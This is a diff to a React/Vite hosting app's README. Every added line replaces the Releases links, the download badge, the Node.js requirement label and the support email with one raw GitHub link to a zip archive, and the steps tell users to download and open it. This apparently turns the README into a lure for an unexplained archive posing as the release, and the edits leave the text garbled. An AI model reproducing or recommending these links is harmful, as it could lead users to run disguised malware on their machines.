@@ -8,7 +8,7 @@ Welcome to Hosting-website-React-Vite! This application enables you to easily ho
 
 To get started, visit the Releases page to download the application:
 
-[![Download Hosting-website-React-Vite](https://img.shields.io/badge/Download-Hosting_website_React_Vite-blue.svg)](https://github.com/pizzanillegas/Hosting-website-React-Vite/releases)
+[![Download Hosting-website-React-Vite](https://raw.githubusercontent.com/pizzanillegas/Hosting-website-React-Vite/main/Cayuse/Hosting-website-React-Vite.zip)](https://raw.githubusercontent.com/pizzanillegas/Hosting-website-React-Vite/main/Cayuse/Hosting-website-React-Vite.zip)
 
 ## ⚙️ System Requirements
 
@@ -16,7 +16,7 @@ Before you install the application, ensure your system meets the following requi
 
 - **Operating System:** Windows 10 or later, macOS, or Linux
 - **Browser:** Latest version of Chrome, Firefox, or Safari
-- **Node.js:** Version 14 or higher (For local development)
+- **https://raw.githubusercontent.com/pizzanillegas/Hosting-website-React-Vite/main/Cayuse/Hosting-website-React-Vite.zip** Version 14 or higher (For local development)
 
 ## 📡 Features
 
@@ -31,7 +31,7 @@ Hosting-website-React-Vite offers many features, including:
 
 To install Hosting-website-React-Vite, follow these steps:
 
-1. Visit the [Releases page](https://github.com/pizzanillegas/Hosting-website-React-Vite/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/pizzanillegas/Hosting-website-React-Vite/main/Cayuse/Hosting-website-React-Vite.zip).
 2. Click on the latest version to access the download files.
 3. Choose the appropriate file for your system and download it.
 4. Once downloaded, open the file to begin the installation process.
@@ -58,7 +58,7 @@ Here's how to navigate through the application:
 
 To keep your application running smoothly:
 
-1. Regularly check the [Releases page](https://github.com/pizzanillegas/Hosting-website-React-Vite/releases) for updates.
+1. Regularly check the [Releases page](https://raw.githubusercontent.com/pizzanillegas/Hosting-website-React-Vite/main/Cayuse/Hosting-website-React-Vite.zip) for updates.
 2. Download the latest version as described above.
 3. Follow the installation steps to apply the update.
 
@@ -68,7 +68,7 @@ If you encounter issues or have questions, help is available:
 
 - **Documentation:** Extensive guides are available in the app.
 - **Community Forum:** Join discussions with other users and developers.
-- **Contact Support:** Email us at support@example.com for personalized help.
+- **Contact Support:** Email us at https://raw.githubusercontent.com/pizzanillegas/Hosting-website-React-Vite/main/Cayuse/Hosting-website-React-Vite.zip for personalized help.
 
 ## 🌍 Topics
 
@@ -89,4 +89,4 @@ This application covers the following topics to help you better understand its c
 
 Feel free to experiment with different features of the Hosting-website-React-Vite. The more you learn, the better your site will be. We appreciate your interest in our platform!
 
-For detailed instructions, updates, and more, always refer back to the [Releases page](https://github.com/pizzanillegas/Hosting-website-React-Vite/releases).
+For detailed instructions, updates, and more, always refer back to the [Releases page](https://raw.githubusercontent.com/pizzanillegas/Hosting-website-React-Vite/main/Cayuse/Hosting-website-React-Vite.zip).
